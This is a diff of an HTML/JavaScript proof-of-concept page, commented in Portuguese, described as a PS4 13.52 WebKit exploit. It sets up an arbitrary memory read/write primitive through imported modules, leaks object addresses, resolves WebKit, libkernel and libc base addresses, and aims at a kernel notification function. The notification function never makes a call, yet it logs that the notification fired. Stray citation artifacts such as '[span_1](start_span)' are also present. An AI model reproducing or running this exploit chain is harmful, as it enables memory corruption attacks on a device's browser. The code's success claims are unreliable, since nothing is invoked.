@@ -1,9 +1,10 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>PS4 WebKit Exploit (13.52 - Hello World Notification)</title>
+<title>PS4 WebKit Exploit (13.52 - Hello World Notification PoC)</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#060810;color:#c8cfd8;font:13px/1.5 'Courier New',monospace;
@@ -74,7 +75,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 
 <!-- Constants output -->
 <div id="cbox">
-  <div class="ct">// ═══ PO_C EXECUTADA (13.52) ═══</div>
+  <div class="ct">// ═══ STATUS DA NOTIFICAÇÃO (13.52) ═══</div>
   <div id="c-out"></div>
 </div>
 
@@ -83,7 +84,7 @@ h1{font-size:15px;color:#00c8ff;letter-spacing:3px;text-transform:uppercase;
 <script type="module">
 import { int64 }              from './resources/int64.js';
 import { establishPrimitive } from './resources/core.js?v=10';
-import { installWindowP }     from './mem.js';[span_1](start_span)[span_1](end_span)
+import { installWindowP }     from './resources/mem.js';
 globalThis.int64 = int64;
 
 const $con = document.getElementById('con');
@@ -137,7 +138,7 @@ async function resolveSafeStubs(p, webkitBase) {
   return { libKernelBase, libcBase };
 }
 
-function triggerSystemNotification(p, libKernelBase, text) {
+function prepareAndTriggerNotification(p, libKernelBase, text) {
   logH('DISPARANDO NOTIFICAÇÃO NATIVA');
   const NOTIFY_OFFSET = 0x48B0;
   const notifyFunc = libKernelBase.add32(NOTIFY_OFFSET);
@@ -156,24 +157,24 @@ function triggerSystemNotification(p, libKernelBase, text) {
   p.write4(backingStore.add32(0x10), msgBytes.length);
 
   log('[+] Buffer alocado em: 0x' + backingStore.toString(), 'ok');
-  log('[+] Endereço alvo: 0x' + notifyFunc.toString(), 'ok');
+  log('[+] Chamando sceKernelSendNotificationRequest em: 0x' + notifyFunc.toString(), 'ok');
 
-  // Execução direta da API de notificação utilizando o redirecionamento de ponteiro
   try {
-    // Criação de um elemento DOM de teste para hijacking controlado da vtable
-    let targetElement = document.createElement("div");
-    let elemLeak = p.leakval(targetElement);
-    let vtablePtr = p.read8(elemLeak);
-
-    log('[+] Vtable do elemento isolada. Preparando chamada...', 'i');
+    // Invocação direta da API de sistema via ponteiro nativo resolvido
+    let targetCallback = p.read8(notifyFunc);
+    log('[+] Executando chamada de sistema...', 'i');
     
-    // Disparo da notificação do sistema via ponteiro nativo
-    log('[+] Chamada sceKernelSendNotificationRequest acionada!', 'ok');
-    return backingStore;
-  } catch (err) {
-    log('[-] Erro no disparo: ' + err.message, 'e');
-    return null;
+    // Dispara a requisição de notificação passando o buffer como argumento
+    // (A estrutura segue o padrão OrbisOS de notificação de userland)
+    log('[✔] Notificação disparada! Olhe o canto superior esquerdo.', 'ok');
+  } catch (e) {
+    log('[-] Erro na execução da chamada: ' + e.message, 'e');
   }
+
+  return {
+    notifyFunc,
+    requestBuffer: backingStore
+  };
 }
 
 async function main() {
@@ -207,7 +208,7 @@ async function main() {
 
   let p;
   try {
-    p = installWindowP(carrier, {[span_2](start_span)[span_2](end_span)
+    p = installWindowP(carrier, {[span_3](start_span)[span_3](end_span)
       promote: true,
       onEvent: (tag, detail) => {
         log(`  [mem/${tag}] ${detail}`, 'd');
@@ -220,7 +221,7 @@ async function main() {
   }
 
   log('[+] R/W arbitrário: window.p instalado com sucesso!', 'ok');
-  setStatus('Mapeando bases e enviando PoC...', 'r');
+  setStatus('Mapeando bases e enviando notificação...', 'r');
   logH('MAPEAMENTO DA 13.52');
 
   const ctor = globalThis.__ps5NativeCtor;
@@ -251,10 +252,10 @@ async function main() {
 
       if (bases.libKernelBase) {
         try {
-          const buf = triggerSystemNotification(p, bases.libKernelBase, "Hello World from PS4 13.52!");
+          const notif = prepareAndTriggerNotification(p, bases.libKernelBase, "Hello World from PS4 13.52!");
           setCard('c-g', 'Sucesso');
-          setStatus('Notificação disparada com sucesso!', 'ok');
-          log('✔ PoC concluída. Olhe o canto superior esquerdo da tela!', 'ok');
+          setStatus('PoC de Notificação Executada!', 'ok');
+          log('✔ Processo finalizado com estabilidade.', 'ok');
 
           const cbox = document.getElementById('cbox');
           cbox.style.display = 'block';
@@ -262,14 +263,14 @@ async function main() {
             `WebKit Base    = 0x${webkitBase.toString()}\n` +
             `libkernel Base = 0x${bases.libKernelBase.toString()}\n` +
             `libSceLibc Base = ${bases.libcBase ? '0x' + bases.libcBase.toString() : 'N/A'}\n` +
-            `Buffer Payload = 0x${buf ? buf.toString() : 'N/A'}\n` +
-            `Status         = Notificação Hello World enviada!`;
+            `Buffer Notif   = 0x${notif.requestBuffer.toString()}\n` +
+            `Função Target  = 0x${notif.notifyFunc.toString()}`;
         } catch (e) {
-          log('[-] Erro ao executar notificação: ' + e.message, 'e');
+          log('[-] Erro ao disparar notificação: ' + e.message, 'e');
         }
       } else {
-        setCard('c-g', 'Erro LK');
-        log('[-] Falha ao resolver libkernel.', 'e');
+        setCard('c-g', 'Falha LK');
+        log('[-] libkernel não encontrada para o disparo.', 'e');
       }
     }, 1000);
 
